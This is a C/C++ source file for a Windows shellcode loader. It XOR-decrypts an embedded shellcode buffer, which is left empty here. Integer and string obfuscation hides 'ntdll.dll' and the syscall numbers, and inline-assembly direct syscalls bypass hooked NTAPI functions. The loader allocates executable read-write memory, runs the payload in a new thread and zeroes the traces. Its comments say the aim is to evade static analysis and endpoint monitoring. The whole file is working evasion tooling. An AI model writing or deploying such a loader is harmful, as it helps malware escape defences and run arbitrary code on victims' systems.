#include <windows.h>
#include <stdio.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define SIZE 1337
#define _ntdll "tnldl"

volatile unsigned char shellcode[] = "";

// int obfuscation in hopes of hardening against static analysis
__attribute__((__noinline__)) int getFree() {
    volatile int x = 0x15;
    volatile int y = 0x09;
    return x + y;
}

// int obfuscation in hopes of hardening against static analysis
__attribute__((__noinline__)) int getAlloc() {
    volatile int x = 0x10;
    volatile int y = 0x08;
    return x + y;
}

// string obfuscation in hopes of hardening against static analysis
__attribute__((__noinline__)) const char* dllNt(char* ptr) {
    ptr[0] = ptr[1] ^ ptr[0];
    ptr[1] = ptr[0] ^ ptr[1];
    ptr[0] = ptr[1] ^ ptr[0];
    
    ptr[2] = ptr[3] ^ ptr[2];
    ptr[3] = ptr[2] ^ ptr[3];
    ptr[2] = ptr[3] ^ ptr[2];

    ptr[5] = '.';
    
    ptr[6] = ptr[2];
    ptr[7] = ptr[4];
    ptr[8] = ptr[3];

    ptr[9] = '\0';

    return ptr;
}


extern "C" NTSTATUS __attribute__((naked)) syscall6(ULONG syscall_number, HANDLE arg1, PVOID arg2,
     ULONG_PTR arg3, PVOID arg4, ULONG_PTR arg5, ULONG_PTR arg6) {
    __asm__ volatile(
        "movl %ecx, %eax\n\t"
        "movq %rdx, %rcx\n\t"
        "movq %r8, %rdx\n\t"
        "movq %r9, %r8\n\t"
        "movq 0x28(%rsp), %r9\n\t"
        "movq 0x30(%rsp), %r11\n\t"
        "movq %r11, 0x28(%rsp)\n\t"
        "movq 0x38(%rsp), %r11\n\t"
        "movq %r11, 0x30(%rsp)\n\t"
        "movq %rcx, %r10\n\t"
        "syscall\n\t"
        "ret\n\t"
    );
}

extern "C" NTSTATUS __attribute__((naked)) syscall4(ULONG syscall_number, HANDLE arg1, PVOID arg2, ULONG_PTR arg3, ULONG_PTR arg4) {
    __asm__ volatile(
        "movl %ecx, %eax\n\t"
        "movq %rdx, %rcx\n\t"
        "movq %r8, %rdx\n\t"
        "movq %r9, %r8\n\t"
        "movq 0x28(%rsp), %r9\n\t"
        "movq %rcx, %r10\n\t"
        "syscall\n\t"
        "ret\n\t"
    );
}


// we use some undocumented NTAPI functions - http://undocumented.ntinternals.net/
extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
     PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    return syscall6(
        getAlloc(),
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        RegionSize,
        AllocationType,
        Protect
    );
}

// we use some undocumented NTAPI functions - http://undocumented.ntinternals.net/
extern "C" NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    return syscall4(
        getFree(),
        ProcessHandle,
        BaseAddress,
        reinterpret_cast<ULONG_PTR>(RegionSize),
        FreeType
    );
}


int main() {
    unsigned char dec[SIZE];
    // decrypt shellcode
    for (size_t i = 0; i < SIZE; ++i) dec[i] = shellcode[i] ^ shellcode[SIZE - 1];


    char* nt = strdup(_ntdll);
    // zero out memory
    SecureZeroMemory((PVOID)shellcode, SIZE);
    HMODULE ntHMod = GetModuleHandleA(dllNt(nt));


    PVOID base = NULL;
    SIZE_T regionSize = SIZE;
    HANDLE thread = NULL;

    HANDLE curProc = GetCurrentProcess();
    
    // allocate memory with syscall instead of heavily hooked NTAPI
    // loudest thing at this stage is RWX
    NTSTATUS stat = NtAllocateVirtualMemory(curProc, &base, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(stat) || !base) goto __exit;
    
    memcpy(base, dec, SIZE);

    // could have maybe done some tinkering to create threads myself but idk
    // ((void(*)())base)();
    thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (!thread) goto __exit;

    WaitForSingleObject(thread, 10000);
    CloseHandle(thread);

    __exit:
        SecureZeroMemory(&dec, SIZE-1);
        SecureZeroMemory(base, SIZE);
        // free memory with syscall instead of heavily hooked NTAPI
        NtFreeVirtualMemory(curProc, &base, &regionSize, MEM_RELEASE);
        free(nt);
        return 0;
}